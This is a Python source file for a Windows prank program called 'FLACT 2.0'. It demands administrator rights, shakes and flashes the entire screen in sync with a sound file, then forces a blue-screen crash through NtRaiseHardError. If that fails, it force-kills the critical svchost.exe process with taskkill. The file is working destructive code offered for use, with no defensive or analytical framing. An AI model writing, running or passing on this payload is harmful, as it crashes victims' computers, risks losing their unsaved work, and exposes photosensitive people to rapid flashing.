import os, sys, time, ctypes
import win32gui, win32api, win32con, winsound
import random, math, wave, contextlib

# --- 1. SYSTEM HELPERS (Fixed the NameError) ---
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def msg_box(text, title="FLACT 2.0", style=0x10):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)

def get_resource_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "FlactSafe", filename)
    if os.path.exists(desktop_path):
        return desktop_path
    return filename if os.path.exists(filename) else None

# --- 2. THE CRASH ---
def hard_crash():
    try:
        # Requesting Shutdown Privilege for BSOD
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except:
        # Backup: Kill critical system process
        os.system("taskkill /f /im svchost.exe")

# --- 3. MAIN ENGINE ---
def main():
    if not is_admin():
        msg_box("Administrator rights required for FLACT 2.0 engine.", "Access Denied")
        return

    sound_file = get_resource_path("6662.0.wav")
    if not sound_file:
        msg_box("6662.0.wav not found! Please put it in the 'FlactSafe' folder on your Desktop.", "Fatal Error")
        return

    hdc = win32gui.GetDC(0)
    sw, sh = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)

    try:
        # Get duration for synchronization
        with contextlib.closing(wave.open(sound_file, 'r')) as f:
            duration = f.getnframes() / float(f.getframerate())

        # Start sound (Asynchronous so visuals play at the same time)
        winsound.PlaySound(sound_file, winsound.SND_FILENAME | winsound.SND_ASYNC)
        
        start_time = time.time()
        hue_angle = 0

        # --- THE VISUAL LOOP (Runs until sound ends) ---
        while (time.time() - start_time) < duration:
            # SHAKE THE ENTIRE SCREEN
            sx, sy = random.randint(-30, 30), random.randint(-30, 30)
            win32gui.BitBlt(hdc, sx, sy, sw, sh, hdc, 0, 0, win32con.SRCCOPY)

            # FLASHING COLOR OVERLAY
            r = int(127 + 127 * math.sin(hue_angle))
            g = int(127 + 127 * math.sin(hue_angle + 2))
            b = int(127 + 127 * math.sin(hue_angle + 4))
            brush = win32gui.CreateSolidBrush(win32api.RGB(r, g, b))
            win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, 0, 0, sw, sh, win32con.PATINVERT)
            win32gui.DeleteObject(brush)

            hue_angle += 1.0
            time.sleep(0.01)

        # --- AFTER THE SOUND ---
        winsound.PlaySound(None, winsound.SND_PURGE) # Stop all audio
        win32gui.ReleaseDC(0, hdc)
        time.sleep(1) # Final dramatic pause
        hard_crash() # Blue Screen

    except Exception as e:
        # Safety: If it fails, clean up the screen instead of crashing
        win32gui.ReleaseDC(0, hdc)
        print(f"Engine Error: {e}")

if __name__ == "__main__":
    main()
